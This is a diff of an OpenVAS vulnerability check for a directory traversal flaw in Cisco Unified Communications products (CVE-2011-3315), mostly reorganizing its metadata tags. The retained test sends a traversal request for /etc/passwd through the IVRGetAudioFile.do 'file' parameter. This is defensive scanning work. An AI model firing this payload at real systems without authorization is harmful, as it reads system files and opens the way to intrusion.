@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_cisco_multiple_products_50372.nasl 9352 2018-04-06 07:13:02Z cfischer $
+# $Id: gb_cisco_multiple_products_50372.nasl 10005 2018-05-29 13:54:41Z cfischer $
 #
 # Multiple Cisco Products 'file' Parameter () Directory Traversal Vulnerability
 #
@@ -25,22 +25,6 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Multiple Cisco products are prone to a directory-traversal
-vulnerability.
-
-Exploiting this issue will allow an attacker to read arbitrary files
-from locations outside of the application's current directory. This
-could help the attacker launch further attacks.
-
-This issue is tracked by Cisco BugID CSCts44049 and CSCth09343.
-
-The following products are affected:
-
-Cisco Unified IP Interactive Voice Response Cisco Unified Contact
-Center Express Cisco Unified Communications Manager";
-
-tag_solution = "Vendor updates are available. Please see the references for details.";
-
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.103402");
@@ -48,7 +32,7 @@ if (description)
  script_cve_id("CVE-2011-3315");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
- script_version ("$Revision: 9352 $");
+ script_version("$Revision: 10005 $");
 
  script_name("Multiple Cisco Products 'file' Parameter () Directory Traversal Vulnerability");
 
@@ -58,7 +42,7 @@ if (description)
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520414");
  script_xref(name : "URL" , value : "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-uccx");
 
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
+ script_tag(name:"last_modification", value:"$Date: 2018-05-29 15:54:41 +0200 (Tue, 29 May 2018) $");
  script_tag(name:"creation_date", value:"2012-01-26 15:59:27 +0100 (Thu, 26 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
@@ -67,32 +51,38 @@ if (description)
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
+
+ script_tag(name : "summary" , value : "Multiple Cisco products are prone to a directory-traversal
+vulnerability.");
+ script_tag(name : "impact" , value : "Exploiting this issue will allow an attacker to read arbitrary files
+from locations outside of the application's current directory. This
+could help the attacker launch further attacks.");
+ script_tag(name : "affected" , value : "Cisco Unified IP Interactive Voice Response Cisco Unified Contact
+
+Center Express Cisco Unified Communications Manager");
+ script_tag(name : "insight" , value : "This issue is tracked by Cisco BugID CSCts44049 and CSCth09343.");
+ script_tag(name : "solution" , value : "Vendor updates are available. Please see the references for details.");
+
+ script_tag(name:"solution_type", value:"VendorFix");
+
  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-   
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-url = string("/"); 
-
-if(http_vuln_check(port:port, url:url,pattern:"cisco")) {
+url = string("/");
+if(http_vuln_check(port:port, url:url,pattern:"cisco", usecache:TRUE)) {
 
   url = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd";
 
   if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
-     
     security_message(port:port);
     exit(0);
-
-  }  
-
+  }
 }
 
 exit(0);
-
